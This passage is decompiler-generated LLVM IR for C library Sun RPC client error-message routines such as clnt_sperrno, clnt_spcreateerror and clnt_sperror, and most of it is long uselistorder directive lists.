  uselistorder i32* @r8, { 102, 103, 16, 75, 76, 77, 78, 79, 80, 17, 43, 44, 104, 108, 42, 81, 82, 62, 109, 110, 111, 165, 39, 2, 6, 168, 166, 167, 18, 15, 83, 19, 40, 41, 20, 45, 105, 106, 46, 107, 21, 7, 112, 113, 90, 91, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 68, 3, 69, 8, 70, 9, 98, 99, 100, 101, 10, 47, 169, 71, 4, 72, 22, 23, 48, 49, 50, 24, 95, 96, 51, 52, 84, 85, 11, 87, 88, 89, 31, 32, 33, 34, 35, 36, 37, 176, 177, 58, 59, 60, 146, 147, 92, 93, 94, 97, 148, 86, 149, 150, 151, 152, 153, 12, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 0, 164, 25, 26, 53, 170, 171, 1, 172, 5, 13, 14, 174, 173, 175, 54, 55, 38, 56, 57, 30, 28, 29, 61, 63, 64, 27, 65, 66, 67, 73, 74 }
  uselistorder i32 65536, { 5, 3, 4, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 90, 21, 22, 95, 91, 0, 97, 1, 92, 2, 96, 23, 24, 25, 27, 26, 28, 93, 29, 30, 31, 32, 33, 94, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 45, 44, 47, 46, 48, 51, 50, 49, 52, 56, 53, 57, 54, 58, 55, 59, 61, 60, 63, 62, 64, 66, 65, 69, 67, 71, 72, 73, 70, 68, 77, 74, 78, 75, 80, 79, 76, 81, 84, 82, 85, 83, 88, 86, 89, 87 }
  uselistorder i32 20, { 117, 118, 107, 108, 109, 52, 23, 110, 2, 121, 51, 134, 119, 36, 37, 38, 39, 40, 41, 42, 43, 120, 53, 54, 55, 56, 57, 58, 59, 44, 60, 61, 62, 63, 64, 111, 112, 122, 123, 124, 125, 65, 66, 114, 67, 0, 45, 46, 47, 48, 138, 139, 126, 127, 128, 129, 130, 132, 133, 131, 136, 113, 74, 135, 115, 32, 33, 34, 35, 49, 50, 68, 69, 70, 71, 72, 73, 116, 137, 75, 76, 77, 78, 79, 80, 81, 24, 20, 19, 25, 82, 26, 27, 22, 21, 28, 83, 29, 30, 3, 4, 84, 85, 86, 5, 6, 87, 88, 89, 7, 8, 90, 91, 9, 10, 92, 93, 94, 95, 1, 12, 11, 96, 97, 98, 14, 13, 99, 100, 101, 16, 15, 102, 103, 104, 105, 106, 17, 18, 31 }
  uselistorder i32 16, { 241, 242, 46, 201, 202, 203, 47, 204, 205, 4, 206, 95, 243, 252, 244, 22, 92, 245, 5, 6, 86, 87, 88, 89, 207, 208, 253, 254, 90, 7, 8, 0, 246, 111, 209, 216, 217, 91, 23, 48, 69, 70, 247, 93, 94, 96, 97, 248, 98, 99, 49, 100, 101, 102, 249, 50, 71, 72, 250, 251, 103, 104, 105, 106, 107, 108, 277, 210, 211, 212, 213, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 278, 268, 15, 192, 109, 239, 110, 24, 112, 17, 113, 114, 51, 16, 115, 116, 52, 117, 118, 119, 120, 121, 14, 221, 222, 218, 9, 219, 220, 73, 74, 75, 18, 76, 77, 79, 78, 80, 82, 83, 81, 84, 294, 295, 296, 297, 223, 224, 225, 226, 227, 228, 214, 215, 229, 230, 231, 269, 270, 271, 272, 273, 274, 279, 280, 281, 232, 233, 234, 10, 136, 275, 53, 122, 123, 124, 125, 282, 283, 284, 285, 290, 291, 292, 293, 286, 287, 288, 19, 126, 127, 240, 1, 2, 11, 67, 12, 25, 68, 13, 128, 129, 289, 3, 130, 131, 132, 133, 134, 135, 85, 276, 137, 54, 138, 139, 140, 141, 142, 55, 143, 144, 145, 146, 147, 148, 56, 149, 57, 150, 58, 151, 20, 59, 152, 60, 61, 62, 153, 154, 155, 26, 156, 27, 28, 157, 63, 158, 29, 159, 160, 30, 161, 31, 162, 32, 163, 164, 165, 33, 166, 167, 168, 34, 169, 170, 35, 171, 172, 36, 173, 174, 175, 37, 176, 38, 177, 39, 178, 40, 179, 41, 180, 181, 182, 183, 42, 184, 64, 185, 186, 187, 43, 188, 189, 190, 44, 191, 193, 194, 195, 196, 45, 21, 197, 198, 199, 200, 235, 236, 237, 65, 238, 66 }
  uselistorder i32 5, { 61, 59, 60, 6, 7, 62, 8, 9, 10, 31, 0, 1, 30, 32, 33, 11, 34, 35, 5, 36, 37, 12, 38, 39, 40, 2, 63, 64, 41, 42, 43, 13, 14, 15, 16, 3, 44, 45, 46, 47, 17, 18, 19, 20, 21, 48, 49, 22, 50, 51, 23, 24, 25, 4, 26, 52, 53, 54, 55, 56, 27, 28, 57, 29, 58 }
  uselistorder i16 0, { 16, 0, 11, 17, 12, 1, 2, 3, 4, 5, 18, 20, 19, 21, 13, 22, 14, 6, 7, 8, 23, 9, 10, 15, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49 }
  uselistorder label %dec_label_pc_10028278, { 1, 0 }
}

define i32 @__GI_clnt_sperrno() local_unnamed_addr {
entry:
  br label %dec_label_pc_10028330

dec_label_pc_10028310:                            ; preds = %dec_label_pc_10028330
  %v1_10028334 = add nuw nsw i32 %v0_10028330, 1
  %v3_10028310 = inttoptr i32 %v2_10028338 to i32*
  %v4_10028310 = load i32, i32* %v3_10028310, align 4
  %v1_10028314 = load i32, i32* @r3, align 4
  %v4_10028314 = icmp eq i32 %v4_10028310, %v1_10028314
  br i1 %v4_10028314, label %dec_label_pc_1002831c, label %dec_label_pc_10028330

dec_label_pc_1002831c:                            ; preds = %dec_label_pc_10028310
  %v1_1002831c = add i32 %v1_10028330, add (i32 ptrtoint (i32* @global_var_1002fe50.1428 to i32), i32 4)
  %v2_1002831c = inttoptr i32 %v1_1002831c to i32*
  %v3_1002831c = load i32, i32* %v2_1002831c, align 4
  %v2_10028328 = add i32 %v3_1002831c, ptrtoint ([13 x i8]* @global_var_1002fee0.1429 to i32)
  ret i32 %v2_10028328

dec_label_pc_10028330:                            ; preds = %dec_label_pc_10028310, %entry
  %v0_1002833c = phi i32 [ %v1_1002833c, %dec_label_pc_10028310 ], [ 19, %entry ]
  %v0_10028330 = phi i32 [ %v1_10028334, %dec_label_pc_10028310 ], [ 0, %entry ]
  %v1_10028330 = mul i32 %v0_10028330, 8
  %v2_10028338 = add i32 %v1_10028330, ptrtoint (i32* @global_var_1002fe50.1428 to i32)
  store i32 %v2_10028338, i32* @r10, align 4
  %v1_1002833c = add nsw i32 %v0_1002833c, -1
  %v2_1002833c = icmp eq i32 %v1_1002833c, 0
  br i1 %v2_1002833c, label %dec_label_pc_10028340, label %dec_label_pc_10028310

dec_label_pc_10028340:                            ; preds = %dec_label_pc_10028330
  ret i32 ptrtoint ([26 x i8]* @global_var_1002fc58.1430 to i32)

; uselistorder directives
  uselistorder i32 %v1_1002833c, { 1, 0 }
  uselistorder i32 %v2_10028338, { 1, 0 }
  uselistorder i32* @r10, { 50, 136, 137, 20, 100, 19, 101, 102, 103, 104, 105, 77, 78, 106, 107, 79, 140, 141, 142, 175, 47, 3, 7, 177, 176, 62, 63, 108, 21, 109, 110, 52, 48, 49, 1, 51, 53, 54, 55, 138, 56, 25, 26, 27, 28, 29, 30, 57, 143, 144, 8, 117, 118, 9, 119, 120, 121, 122, 123, 124, 145, 146, 147, 6, 148, 149, 10, 87, 11, 88, 89, 90, 2, 91, 12, 92, 93, 129, 13, 130, 131, 132, 133, 134, 58, 59, 60, 61, 180, 181, 178, 14, 179, 15, 94, 64, 65, 127, 111, 4, 113, 114, 115, 116, 36, 38, 37, 40, 39, 41, 42, 43, 44, 45, 46, 99, 71, 72, 73, 74, 150, 151, 152, 154, 23, 22, 153, 125, 126, 128, 155, 112, 186, 156, 157, 158, 160, 161, 162, 159, 24, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 5, 0, 139, 185, 17, 18, 16, 182, 184, 183, 31, 32, 33, 34, 35, 66, 67, 68, 69, 70, 75, 76, 96, 80, 81, 82, 83, 84, 85, 86, 95, 97, 98, 135 }
  uselistorder i32 19, { 0, 2, 7, 8, 9, 1, 10, 5, 6, 3, 4 }
}

define i32 @free_mem() local_unnamed_addr {
entry:
  store i32 268600156, i32* @lr, align 4
  %v0_10028358 = call i32 @__rpc_thread_variables()
  %v1_1002835c = add i32 %v0_10028358, 156
  %v2_1002835c = inttoptr i32 %v1_1002835c to i32*
  %v3_1002835c = load i32, i32* %v2_1002835c, align 4
  store i32 %v3_1002835c, i32* @r3, align 4
  store i32 268600164, i32* @lr, align 4
  %v0_10028360 = call i32 @free()
  ret i32 %v0_10028360

; uselistorder directives
  uselistorder i32 ()* @free, { 63, 55, 60, 13, 12, 32, 31, 30, 29, 28, 27, 26, 25, 59, 58, 57, 56, 14, 54, 9, 62, 61, 11, 10, 8, 7, 6, 5, 4, 3, 2, 1, 53, 52, 51, 50, 49, 48, 47, 46, 24, 23, 22, 21, 20, 34, 19, 18, 38, 37, 39, 17, 0, 45, 44, 36, 35, 16, 43, 42, 41, 40, 33, 15 }
}

define i32 @clnt_perrno() local_unnamed_addr {
entry:
  %v0_10028378 = load i32, i32* @lr, align 4
  %v0_10028384 = call i32 @__GI_clnt_sperrno()
  %v3_10028390 = load i32, i32* @global_var_1004511c, align 4
  store i32 %v0_10028378, i32* @lr, align 4
  %v3_100283a0 = call i32 @__GI_fputs(i32 %v0_10028384, i32 %v3_10028390, i32 268697600)
  ret i32 %v3_100283a0
}

define i32 @_buf() local_unnamed_addr {
entry:
  %v0_100283ac = load i32, i32* @r31, align 4
  store i32 268600248, i32* @lr, align 4
  %v0_100283b4 = call i32 @__rpc_thread_variables()
  %v1_100283b8 = add i32 %v0_100283b4, 156
  %v2_100283b8 = inttoptr i32 %v1_100283b8 to i32*
  %v3_100283b8 = load i32, i32* %v2_100283b8, align 4
  store i32 256, i32* @r3, align 4
  %v3_100283c4 = icmp eq i32 %v3_100283b8, 0
  br i1 %v3_100283c4, label %dec_label_pc_100283cc, label %dec_label_pc_100283d4

dec_label_pc_100283cc:                            ; preds = %entry
  store i32 268600272, i32* @lr, align 4
  %v0_100283cc = call i32 @malloc()
  %v1_100283d0 = load i32, i32* @r31, align 4
  %v2_100283d0 = add i32 %v1_100283d0, 156
  %v3_100283d0 = inttoptr i32 %v2_100283d0 to i32*
  store i32 %v0_100283cc, i32* %v3_100283d0, align 4
  %v0_100283d8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100283d4

dec_label_pc_100283d4:                            ; preds = %entry, %dec_label_pc_100283cc
  %v0_100283d8 = phi i32 [ %v0_100283b4, %entry ], [ %v0_100283d8.pre, %dec_label_pc_100283cc ]
  %v1_100283d8 = add i32 %v0_100283d8, 156
  %v2_100283d8 = inttoptr i32 %v1_100283d8 to i32*
  %v3_100283d8 = load i32, i32* %v2_100283d8, align 4
  store i32 %v0_100283ac, i32* @r31, align 4
  ret i32 %v3_100283d8

; uselistorder directives
  uselistorder i32 ()* @malloc, { 44, 47, 3, 2, 13, 12, 49, 48, 7, 46, 45, 43, 5, 4, 42, 1, 50, 0, 14, 11, 10, 36, 37, 41, 26, 40, 39, 38, 35, 34, 15, 33, 32, 31, 30, 29, 28, 27, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 6, 9, 8 }
  uselistorder i32 256, { 68, 0, 1, 2, 3, 58, 57, 74, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 54, 66, 69, 15, 16, 17, 18, 19, 20, 21, 78, 22, 79, 80, 81, 82, 23, 24, 25, 26, 27, 59, 55, 75, 60, 28, 29, 30, 31, 32, 33, 34, 35, 70, 67, 36, 37, 38, 76, 39, 40, 77, 41, 42, 43, 44, 45, 46, 47, 48, 56, 83, 61, 49, 50, 51, 52, 53, 62, 63, 71, 72, 73, 64, 65 }
  uselistorder i32 156, { 1, 2, 3, 0, 4 }
  uselistorder i32 ()* @__rpc_thread_variables, { 13, 18, 6, 17, 16, 15, 14, 12, 2, 0, 4, 11, 3, 10, 1, 9, 5, 8, 7 }
  uselistorder label %dec_label_pc_100283d4, { 1, 0 }
}

define i32 @clnt_spcreateerror() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-1048 = alloca i32, align 4
  %v0_100283f8 = load i32, i32* @r3, align 4
  store i32 %v0_100283f8, i32* @r29, align 4
  store i32 268600324, i32* @lr, align 4
  %v0_10028400 = call i32 @_buf()
  store i32 %v0_10028400, i32* @r30, align 4
  %v3_10028404 = icmp eq i32 %v0_10028400, 0
  br i1 %v3_10028404, label %dec_label_pc_100284f4, label %dec_label_pc_1002840c

dec_label_pc_1002840c:                            ; preds = %entry
  store i32 268600336, i32* @lr, align 4
  %v0_1002840c = call i32 @__GI___rpc_thread_createerr()
  %v0_10028420 = load i32, i32* @r30, align 4
  store i32 %v0_10028420, i32* @r3, align 4
  store i32 268600364, i32* @lr, align 4
  %v1_10028428 = call i32 @sprintf(i32 %v0_10028420)
  %v0_10028430 = load i32, i32* @r30, align 4
  %v2_10028430 = add i32 %v0_10028430, %v1_10028428
  store i32 %v2_10028430, i32* %r29.global-to-local, align 4
  %v0_10028434 = load i32, i32* @r31, align 4
  %v1_10028434 = inttoptr i32 %v0_10028434 to i32*
  %v2_10028434 = load i32, i32* %v1_10028434, align 4
  store i32 %v2_10028434, i32* @r3, align 4
  %v0_10028438 = call i32 @__GI_clnt_sperrno()
  %v2_10028444 = inttoptr i32 %v0_10028438 to i8*
  %v3_10028444 = call i32 @strcpy(i32 %v2_10028430, i8* %v2_10028444)
  %v0_10028448 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10028448, i32* @r3, align 4
  %v0_1002844c = call i32 @__GI_strlen()
  %v0_10028450 = load i32, i32* @r31, align 4
  %v1_10028450 = inttoptr i32 %v0_10028450 to i32*
  %v2_10028450 = load i32, i32* %v1_10028450, align 4
  %v2_10028458 = add i32 %v0_10028448, %v0_1002844c
  store i32 %v2_10028458, i32* %r29.global-to-local, align 4
  %v3_10028464 = icmp eq i32 %v2_10028450, 12
  br i1 %v3_10028464, label %dec_label_pc_100284ac, label %dec_label_pc_10028470

dec_label_pc_10028470:                            ; preds = %dec_label_pc_1002840c
  %v3_10028468 = icmp eq i32 %v2_10028450, 14
  br i1 %v3_10028468, label %dec_label_pc_1002847c, label %dec_label_pc_100284e4

dec_label_pc_1002847c:                            ; preds = %dec_label_pc_10028470
  %v4_1002847c = call i32 @strcpy(i32 %v2_10028458, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002fc7c.1432, i32 0, i32 0))
  %v0_10028480 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10028480, i32* @r3, align 4
  %v0_10028484 = call i32 @__GI_strlen()
  %v2_10028488 = add i32 %v0_10028480, %v0_10028484
  store i32 %v2_10028488, i32* @r29, align 4
  %v0_1002848c = load i32, i32* @r31, align 4
  %v1_1002848c = add i32 %v0_1002848c, 4
  %v2_1002848c = inttoptr i32 %v1_1002848c to i32*
  %v3_1002848c = load i32, i32* %v2_1002848c, align 4
  store i32 %v3_1002848c, i32* @r3, align 4
  %v0_10028490 = call i32 @__GI_clnt_sperrno()
  %v0_10028498 = load i32, i32* @r29, align 4
  %v2_1002849c = inttoptr i32 %v0_10028490 to i8*
  %v3_1002849c = call i32 @strcpy(i32 %v0_10028498, i8* %v2_1002849c)
  %v0_100284a0 = load i32, i32* @r29, align 4
  store i32 %v0_100284a0, i32* @r3, align 4
  %v0_100284a4 = call i32 @__GI_strlen()
  br label %dec_label_pc_100284e0

dec_label_pc_100284ac:                            ; preds = %dec_label_pc_1002840c
  %v2_1002842c = ptrtoint i32* %stack_var_-1048 to i32
  %v4_100284ac = call i32 @strcpy(i32 %v2_10028458, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002fc7c.1432, i32 0, i32 0))
  %v0_100284b0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100284b0, i32* @r3, align 4
  %v0_100284b4 = call i32 @__GI_strlen()
  store i32 1024, i32* @r5, align 4
  %v2_100284bc = add i32 %v0_100284b0, %v0_100284b4
  store i32 %v2_100284bc, i32* %r29.global-to-local, align 4
  %v0_100284c0 = load i32, i32* @r31, align 4
  %v1_100284c0 = add i32 %v0_100284c0, 8
  %v2_100284c0 = inttoptr i32 %v1_100284c0 to i32*
  %v3_100284c0 = load i32, i32* %v2_100284c0, align 4
  store i32 %v3_100284c0, i32* @r3, align 4
  store i32 268600524, i32* @lr, align 4
  %v3_100284c8 = call i32 @__GI___glibc_strerror_r(i32 %v3_100284c0, i32 %v2_1002842c, i32 1024)
  %v0_100284cc = load i32, i32* @r29, align 4
  %v2_100284d4 = bitcast i32* %stack_var_-1048 to i8*
  %v3_100284d4 = call i32 @strcpy(i32 %v0_100284cc, i8* %v2_100284d4)
  %v0_100284d8 = load i32, i32* @r29, align 4
  store i32 %v0_100284d8, i32* @r3, align 4
  %v0_100284dc = call i32 @__GI_strlen()
  br label %dec_label_pc_100284e0

dec_label_pc_100284e0:                            ; preds = %dec_label_pc_1002847c, %dec_label_pc_100284ac
  %storemerge = phi i32 [ %v0_100284dc, %dec_label_pc_100284ac ], [ %v0_100284a4, %dec_label_pc_1002847c ]
  %v0_100284e0 = load i32, i32* @r29, align 4
  %v2_100284e0 = add i32 %v0_100284e0, %storemerge
  store i32 %v2_100284e0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100284e4

dec_label_pc_100284e4:                            ; preds = %dec_label_pc_10028470, %dec_label_pc_100284e0
  %v2_100284e8 = phi i32 [ %v2_10028458, %dec_label_pc_10028470 ], [ %v2_100284e0, %dec_label_pc_100284e0 ]
  %v3_100284e8 = add i32 %v2_100284e8, 1
  %v4_100284e8 = inttoptr i32 %v3_100284e8 to i8*
  store i8 0, i8* %v4_100284e8, align 1
  %v2_100284f0 = load i32, i32* %r29.global-to-local, align 4
  %v3_100284f0 = inttoptr i32 %v2_100284f0 to i8*
  store i8 10, i8* %v3_100284f0, align 1
  %v0_100284f8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100284f4

dec_label_pc_100284f4:                            ; preds = %entry, %dec_label_pc_100284e4
  %v0_100284f8 = phi i32 [ 0, %entry ], [ %v0_100284f8.pre, %dec_label_pc_100284e4 ]
  ret i32 %v0_100284f8

; uselistorder directives
  uselistorder i32 %v2_10028458, { 0, 2, 1, 3 }
  uselistorder i32* %r29.global-to-local, { 2, 0, 1, 4, 3, 5, 6, 7 }
  uselistorder i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1002fc7c.1432, i32 0, i32 0), { 1, 0 }
  uselistorder i32 14, { 3, 8, 9, 10, 1, 2, 12, 0, 11, 4, 5, 6, 7 }
  uselistorder i32 12, { 57, 202, 203, 183, 184, 185, 0, 186, 187, 188, 18, 67, 206, 30, 58, 59, 60, 61, 189, 62, 1, 226, 19, 207, 227, 7, 228, 11, 12, 13, 20, 63, 64, 65, 66, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 208, 204, 205, 68, 71, 69, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 209, 82, 83, 42, 21, 210, 22, 211, 212, 27, 84, 85, 86, 190, 213, 214, 215, 216, 217, 218, 219, 220, 6, 8, 221, 222, 223, 233, 87, 199, 200, 88, 235, 236, 237, 238, 5, 229, 2, 3, 4, 23, 24, 17, 89, 90, 25, 91, 92, 93, 191, 192, 193, 194, 94, 158, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 251, 195, 224, 225, 196, 197, 116, 112, 247, 248, 240, 241, 242, 243, 104, 244, 9, 95, 96, 97, 98, 99, 55, 100, 101, 102, 103, 105, 234, 249, 239, 106, 201, 26, 28, 29, 107, 232, 108, 231, 230, 250, 246, 245, 109, 110, 111, 56, 10, 113, 114, 115, 117, 118, 119, 120, 121, 122, 123, 124, 14, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 15, 153, 154, 155, 156, 157, 16, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 198 }
  uselistorder i32 ()* @__GI___rpc_thread_createerr, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100284f4, { 1, 0 }
  uselistorder label %dec_label_pc_100284e4, { 1, 0 }
  uselistorder label %dec_label_pc_100284e0, { 1, 0 }
}

define i32 @clnt_pcreateerror() local_unnamed_addr {
entry:
  %v0_10028510 = load i32, i32* @lr, align 4
  store i32 268600608, i32* @lr, align 4
  %v0_1002851c = call i32 @clnt_spcreateerror()
  %v3_10028528 = load i32, i32* @global_var_1004511c, align 4
  store i32 %v0_10028510, i32* @lr, align 4
  %v3_10028538 = call i32 @__GI_fputs(i32 %v0_1002851c, i32 %v3_10028528, i32 268697600)
  ret i32 %v3_10028538
}

define i32 @__GI_clnt_sperror() local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1052 = alloca i32, align 4
  %stack_var_-1064 = alloca i32, align 4
  %v0_10028548 = load i32, i32* @r3, align 4
  store i32 %v0_10028548, i32* @r31, align 4
  %v0_10028550 = load i32, i32* @r4, align 4
  store i32 %v0_10028550, i32* @r30, align 4
  store i32 268600664, i32* @lr, align 4
  %v0_10028554 = call i32 @_buf()
  store i32 %v0_10028554, i32* %r28.global-to-local, align 4
  %v3_10028558 = icmp eq i32 %v0_10028554, 0
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_10028558, label %dec_label_pc_10028704, label %dec_label_pc_10028564

dec_label_pc_10028564:                            ; preds = %entry
  %v0_10028564 = load i32, i32* @r31, align 4
  %v1_10028564 = add i32 %v0_10028564, 4
  %v2_10028564 = inttoptr i32 %v1_10028564 to i32*
  %v3_10028564 = load i32, i32* %v2_10028564, align 4
  store i32 %v0_10028564, i32* %r3.global-to-local, align 4
  %v1_10028570 = add i32 %v3_10028564, 8
  %v2_10028570 = inttoptr i32 %v1_10028570 to i32*
  %v3_10028570 = load i32, i32* %v2_10028570, align 4
  call void @__pseudo_call(i32 %v3_10028570)
  %v0_10028588 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10028588, i32* @r3, align 4
  store i32 268600724, i32* @lr, align 4
  %v1_10028590 = call i32 @sprintf(i32 %v0_10028588)
  %v0_10028594 = load i32, i32* @r28, align 4
  %v2_10028594 = add i32 %v0_10028594, %v1_10028590
  store i32 %v2_10028594, i32* %r29.global-to-local, align 4
  %v3_10028598 = load i32, i32* %stack_var_-1064, align 4
  store i32 %v3_10028598, i32* @r3, align 4
  %v0_1002859c = call i32 @__GI_clnt_sperrno()
  store i32 %v2_10028594, i32* %r3.global-to-local, align 4
  %v2_100285a8 = inttoptr i32 %v0_1002859c to i8*
  %v3_100285a8 = call i32 @strcpy(i32 %v2_10028594, i8* %v2_100285a8)
  %v0_100285ac = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100285ac, i32* @r3, align 4
  %v0_100285b0 = call i32 @__GI_strlen()
  store i32 %v0_100285b0, i32* %r3.global-to-local, align 4
  %v3_100285b4 = load i32, i32* %stack_var_-1064, align 4
  %v2_100285b8 = add i32 %v0_100285ac, %v0_100285b0
  store i32 %v2_100285b8, i32* %r31.global-to-local, align 4
  %v2_100285bc = icmp ugt i32 %v3_100285b4, 17
  br i1 %v2_100285bc, label %dec_label_pc_100286d0, label %dec_label_pc_100285c4

dec_label_pc_100285c4:                            ; preds = %dec_label_pc_10028564
  %v1_100285c8 = mul i32 %v3_100285b4, 4
  %v2_100285d0 = add i32 %v1_100285c8, ptrtoint (i32* @global_var_1002fd00.1434 to i32)
  %v3_100285d0 = inttoptr i32 %v2_100285d0 to i32*
  %v4_100285d0 = load i32, i32* %v3_100285d0, align 4
  %v2_100285d4 = add i32 %v4_100285d0, ptrtoint (i32* @global_var_1002fd00.1434 to i32)
  call void @__pseudo_branch(i32 %v2_100285d4)
  store i32 %tmp4, i32* @r3, align 4
  %v2_100285e4 = ptrtoint i32* %stack_var_-1052 to i32
  store i32 %v2_100285e4, i32* %r29.global-to-local, align 4
  store i32 1024, i32* @r5, align 4
  store i32 268600820, i32* @lr, align 4
  %v3_100285f0 = call i32 @__GI___glibc_strerror_r(i32 %tmp4, i32 %v2_100285e4, i32 1024)
  %v0_10028600 = load i32, i32* @r31, align 4
  store i32 %v0_10028600, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002860c.1436 to i32), i32* @lr, align 4
  %v1_10028608 = call i32 @sprintf(i32 %v0_10028600)
  br label %dec_label_pc_100286ec

dec_label_pc_100286d0:                            ; preds = %dec_label_pc_10028564
  store i32 %v2_100285b8, i32* @r3, align 4
  store i32 268601068, i32* @lr, align 4
  %v1_100286e8 = call i32 @sprintf(i32 %v2_100285b8)
  br label %dec_label_pc_100286ec

dec_label_pc_100286ec:                            ; preds = %dec_label_pc_100285c4, %dec_label_pc_100286d0
  %storemerge = phi i32 [ %v1_100286e8, %dec_label_pc_100286d0 ], [ %v1_10028608, %dec_label_pc_100285c4 ]
  %v0_100286ec = load i32, i32* @r31, align 4
  %v2_100286ec = add i32 %v0_100286ec, %storemerge
  store i32 %v2_100286ec, i32* %r31.global-to-local, align 4
  %v0_100286f4 = load i32, i32* @r28, align 4
  store i32 %v0_100286f4, i32* %r3.global-to-local, align 4
  %v3_100286f8 = add i32 %v2_100286ec, 1
  %v4_100286f8 = inttoptr i32 %v3_100286f8 to i8*
  store i8 0, i8* %v4_100286f8, align 1
  %v2_10028700 = load i32, i32* %r31.global-to-local, align 4
  %v3_10028700 = inttoptr i32 %v2_10028700 to i8*
  store i8 10, i8* %v3_10028700, align 1
  %v0_10028714.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10028704

dec_label_pc_10028704:                            ; preds = %entry, %dec_label_pc_100286ec
  %v0_10028714 = phi i32 [ 0, %entry ], [ %v0_10028714.pre, %dec_label_pc_100286ec ]
  ret i32 %v0_10028714

; uselistorder directives
  uselistorder i32 %v2_100285b8, { 1, 0, 2 }
  uselistorder i32 %v2_10028594, { 1, 0, 2 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 2, 0, 1 }
  uselistorder i8 10, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 4, 23, 3, 26, 5, 6, 27, 56, 54, 1, 25, 57, 58, 55, 2, 24, 0, 16, 28, 29, 15, 30, 31, 14, 32, 33, 13, 34, 35, 12, 36, 37, 11, 38, 39, 10, 40, 41, 9, 42, 43, 8, 44, 45, 7, 46, 47, 17, 18, 19, 48, 49, 20, 50, 51, 21, 52, 53, 22 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 17, { 17, 0, 4, 2, 5, 24, 6, 18, 19, 20, 21, 7, 8, 9, 10, 11, 3, 27, 28, 25, 26, 23, 12, 13, 14, 1, 15, 22, 16 }
  uselistorder i32 (i32, i8*)* @strcpy, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 ()* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32)* @sprintf, { 21, 23, 20, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 8, { 118, 105, 0, 256, 257, 258, 259, 46, 47, 260, 263, 264, 265, 266, 267, 116, 34, 106, 107, 108, 1, 109, 110, 295, 268, 269, 270, 44, 303, 114, 335, 336, 337, 261, 262, 111, 2, 3, 112, 41, 113, 115, 132, 292, 293, 117, 48, 4, 5, 6, 7, 8, 9, 119, 340, 120, 121, 122, 123, 339, 124, 125, 126, 127, 128, 129, 130, 294, 49, 131, 133, 134, 296, 297, 135, 136, 137, 43, 138, 139, 298, 70, 72, 71, 73, 74, 299, 300, 301, 302, 75, 140, 141, 10, 271, 304, 305, 306, 307, 308, 309, 310, 311, 33, 312, 313, 314, 350, 351, 380, 383, 28, 250, 251, 352, 35, 142, 36, 287, 288, 143, 362, 361, 359, 360, 341, 342, 343, 363, 364, 365, 11, 144, 50, 51, 145, 146, 52, 274, 275, 276, 53, 277, 147, 148, 54, 37, 39, 40, 149, 150, 151, 152, 153, 273, 235, 236, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 377, 378, 379, 12, 384, 13, 381, 382, 278, 279, 280, 272, 191, 315, 316, 317, 318, 319, 38, 320, 321, 322, 14, 15, 323, 324, 16, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 27, 17, 353, 354, 355, 281, 282, 283, 284, 194, 195, 285, 189, 165, 166, 366, 367, 18, 19, 20, 21, 22, 101, 338, 102, 154, 155, 156, 159, 161, 162, 163, 160, 164, 157, 158, 167, 168, 169, 356, 357, 358, 373, 374, 375, 368, 369, 290, 65, 55, 66, 67, 68, 56, 170, 